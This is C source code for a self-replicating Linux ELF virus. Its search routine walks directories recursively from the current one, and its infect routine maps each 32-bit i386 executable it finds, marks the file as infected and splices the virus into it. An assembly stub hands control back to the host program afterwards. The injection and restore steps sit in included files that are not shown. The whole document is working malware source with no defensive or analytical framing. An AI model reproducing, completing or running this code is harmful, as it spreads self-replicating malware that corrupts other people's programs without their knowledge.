#include <stdio.h>
#include <unistd.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>

typedef struct {
	int size;
	void *self;
} globals;
register globals *g asm("ebp");

extern void virus_start;
static void virus_end(void);

asm(	".globl fake_host; fake_host: mov $1, %eax; int $0x80");
asm(	".globl virus_start; virus_start:\n"
	"pusha; call virus; popa; .byte 0xe9; .long virus_start - . - 4");

#include "../h/syscalls.h"
#include "../h/infect.h"
#include "../h/strings.c"

#include "ari.c"

static void infect(char *filename)
{
	int h, l, i;
	char *m;
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
	Elf32_Shdr *shdr;

	/* open victim, check size, mmap... */	
	if ((h = open(filename, 2)) < 0)
		return;
	if ((l = lseek(h, 0, 2)) < MIN_VICTIM_SIZE || l > MAX_VICTIM_SIZE)
		goto _close;
	m = (void*)mmap(0x1000, l, PROT_READ|PROT_WRITE, MAP_SHARED, h, 0);
	if (m > (char*)0xfffff000)
		goto _close;
	/* check ELF header */
	ehdr = (Elf32_Ehdr*)m;
	phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
	if (ehdr->e_type != ET_EXEC || ehdr->e_machine != EM_386 ||
		ehdr->e_version != EV_CURRENT ||
		(ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE &&
		 ehdr->e_ident[EI_OSABI] != ELFOSABI_TARGET))
		goto _unmap;
	/* already infected? */
	if (m[15])
		goto _unmap;
#include "infect-compr.c"
	m[15]++;
_unmap:	munmap(m, l);
_close:	close(h);
}

static void search(char *dir_name)
{
	struct stat sbuf;
	struct dirent d;
	int h;
	char ddot[3] = { '.', '.', '\0' };

	if (dir_name == NULL)
		dir_name = ddot + 1;
	if ((h = open(dir_name, 0)) < 0)
		return;
	while (readdir(h, &d)) {
		if (d.d_name[0] == '.')
			if (d.d_name[1] == '\0' || *(uint16_t*)(d.d_name + 1) == 0x2e)
				continue;
		lstat(d.d_name, &sbuf);
		if (S_ISLNK(sbuf.st_mode))
			continue;
		if (chdir(d.d_name) == 0) {
			search(ddot + 1);
			chdir(ddot);
		} else {
			if (access(d.d_name, X_OK) == 0)
				infect(d.d_name);
		}
	}
	close(h);
}

void virus(uint32_t esp)
{
	/* determine our own size and location in memory, init globals */
	globals glob;
	g = &glob;
	g->size = (uint32_t)&virus_end - (uint32_t)&virus_start;
	g->self = (void*)__builtin_return_address(0) - 6;
	/* do our job */
	search(NULL);	
#include "restore.c"
}

static void virus_end(void){};
